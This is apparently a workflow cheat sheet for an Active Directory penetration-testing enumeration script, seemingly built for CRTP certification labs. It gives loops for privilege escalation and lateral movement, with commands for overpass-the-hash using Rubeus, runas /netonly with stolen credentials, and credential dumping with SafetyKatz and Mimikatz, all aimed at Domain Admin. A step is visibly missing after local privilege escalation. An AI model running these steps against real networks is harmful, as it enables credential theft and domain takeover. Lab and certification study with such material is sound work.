WORKFLOW LOOP (repeat after every new foothold)
------------------------------------------------
 1) Invoke-CRTPEnum  -> read 00_SUMMARY.txt (HIGH first) + the ">>> RECOMMENDED NEXT MOVE" line
 2) open ATTACK_CHAIN.txt -> pick the PRIMARY path (or an ALT if it's a honeypot/dead end);
    each finding has a "1) 2) 3) => WIN" chain. Exact syntax is in EXPLOIT_COMMANDS.txt
 3) fill the <placeholders> (cracked hash, wordlist, DC name, cert pass)
 4) run it with YOUR tools (Rubeus / Certify / Invoke-Mimi / minidumpdotnet)
 5) new creds/host -> re-run Invoke-CRTPEnum from there (check NEW_this_run.txt for the delta)

AFTER LOCAL PRIVESC (became local admin / SYSTEM on a box)
------------------------------------------------
 1) Re-run scoped to THIS box - your token changed:
        .\Invoke-CRTPEnum.ps1 -Domain <dom> -Target <thisbox> -HostSweep
    - sec 00 confirms new privs (SeDebug/SeImpersonate now enabled)

    (or SafetyKatz)  -> you now hold another user's hash/ticket

 3) Become that new identity (THE key step), pick one:
        runas /netonly /user:<dom>\<user> powershell            (have password)
        Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt         (overpass-the-hash)

 4) Re-enumerate AS that identity:
        # option A - in the runas/PTT shell, just run it (inherits the context):
            .\Invoke-CRTPEnum.ps1 -Domain <dom> -HostSweep
        # option B - no shell needed, hand creds to the LDAP engine:

            $cred = New-Object System.Management.Automation.PSCredential('<dom>\<user>',$sec)
            .\Invoke-CRTPEnum.ps1 -Domain <dom> -Credential $cred

 5) New findings -> new hops. Repeat until a path reaches DA/EA.
    _MASTER_findings.txt accumulates everything across identities.

 NOTE: -Credential drives the built-in LDAP engine (directory data as that user).
 PowerView / host-sweep / local sections still use the CURRENT process token, so
 for those "as another user", use the runas/netonly or PTT shell (option A).
